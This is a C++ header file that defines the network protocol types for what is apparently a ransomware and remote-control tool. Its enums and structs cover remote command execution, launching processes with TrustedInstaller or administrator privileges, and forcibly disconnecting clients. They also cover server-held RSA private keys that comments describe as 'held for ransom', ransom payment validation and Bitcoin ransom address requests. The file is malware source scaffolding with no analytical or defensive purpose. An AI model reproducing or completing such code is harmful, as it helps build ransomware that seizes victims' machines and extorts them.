#ifndef _NETWORK_TYPES_
#define _NETWORK_TYPES_

#include <openssl/bio.h>

// Response codes sent from the client to the server
// Usually after a remoteaction is completed
// 'C' = Code
enum ClientResponseCode {
    C_OK                = 0,
    C_ERROR             = -1,
};

// Enums dictating which action to perform on the client
// Sent from the server to client
enum RemoteAction {
    NONE                  = -1,
    USE_CLI               = 0x832182,
    OPEN_REMOTE_PROCESS   = 0x317238,
    KILL_CLIENT           = 0x821921, // forcefully disconnect the client
    PING_CLIENT           = 0x94932,
    SEND_PUBLIC_RSA_KEY = 0x392191,
    RETURN_PUBLIC_RSA_KEY = 0x403920, // respond to a request that asked for a public rsa key
    RETURN_PRIVATE_RSA_KEY = 0x94811,
};

enum SocketTypes {
    UDP = 1,
    TCP = 2,
};

/*
    A struct representing a server that
    clients can connect to and send requests on.
    Servers have a socket file descriptor which is used
    to send and receive information over sockets.
*/
struct Server {
    SOCKET             sfd;      // Socket File Descriptor
    int                domain;   
    int                type;     // Communcation semmantic type. All servers are SOCK_STREAM
    int                protocol; // Server protocol. All server protocols will be 0.
    int                port;     
    sockaddr_in        addr;     // address struct with info on the server address
    //addrinfo           addrInfo; // newer version of sockaddr_in
    BOOL               alive;    // is server on
    
    Server()
        : sfd(INVALID_SOCKET), domain(AF_INET), type(-1),
        protocol(0), port(-1), addr({0}), alive(FALSE)
    {
    }
    
    Server(int sfd, int domain, int type, int port, sockaddr_in addr)
        : sfd(sfd), domain(domain), type(type),
        protocol(0), port(port), addr(addr),
        alive(FALSE)
    {
    }
};

/*
    A struct representing a message sent from
    a client to a server. 
*/
struct ClientResponse {
    std::string        message;         // String message, detailed info on the error or action
    ClientResponseCode responseCode = C_ERROR;    
    RemoteAction       actionPerformed; // ( if any, otherwise put NONE )
    long               id; // identify different clientreponses from eachother
};

struct ProcessInformation {
    /*
        If run as trusted installer and run as admin
        are both true, the process will be ran with the highest
        privellages, in this case, trusted installer.
    */
    BOOL               runAsTrustedInstaller;
    BOOL               runAsAdministrator;
    DWORD              creationFlags;         // Windows openprocess creation flags
    std::string        applicationName;       // Name of the application to start
};

// Command sent to the client from the server
typedef struct {
    bool              valid;

    /*
        'pi' is information about a process the server
        wants to start on the remote machine, if the action is
        OPEN_REMOTE_PROCESS, pi will be looked at, otherwise pi can be
        set as NULL
    */
    ProcessInformation pi;

    /*
        The command line arguments provided if action is
        USE_CLI or anything related to the command line,
        otherwise this can be an empty string
    */
    std::string        commandLineArguments;

    /*
        The uniquely generated public RSA encryption key
        that is stored on the server alongside the private RSA
        encryption key. Used to encrypt.

        in string form because you cant send BIO* over sockets.
    */
    std::string        publicEncryptionKey;

    /*
        The RSA Private key the client can use to decrypt
        anything encrypted with the 'publicEncryptionKey'

        Usually the thing held for ransom, so a check should
        be held if a ransom has been paid.

        in string form because you cant send BIO* over sockets.
    */
    std::string        privateEncryptionKey;

    // the action to perform of RemoteAction enum
    RemoteAction       action;
} ServerCommand, ServerRequest, ServerResponse;

// A response from the udp server to the udp client
// contains information about the tcp server
typedef struct {
    Server  TCPServer; // Info about the tcp server so the client can connect to it
    BOOL               isValid;
} UDPResponse, UDPMessage;

/*
    When a client requests the tcp server to do something
*/
typedef struct {
    enum Action {
        NONE = 0x000000,
        CONNECT_CLIENT = 0x100000,
        REQUEST_PUBLIC_ENCRYPTION_KEY = 0x200000,
        REQUEST_PRIVATE_ENCRYPTION_KEY = 0x92321,
        VALIDATE_RANSOM_PAYMENT = 0x300000,
        REQUEST_RANSOM_BTC_ADDRESS = 0x400000,
        PING = 0x500000,
    };

    BOOL              valid;
    Action            action;
    SOCKET            udp;
    SOCKET            tcp;
    std::string       temp;
} ClientRequest, ClientMessage;

#endif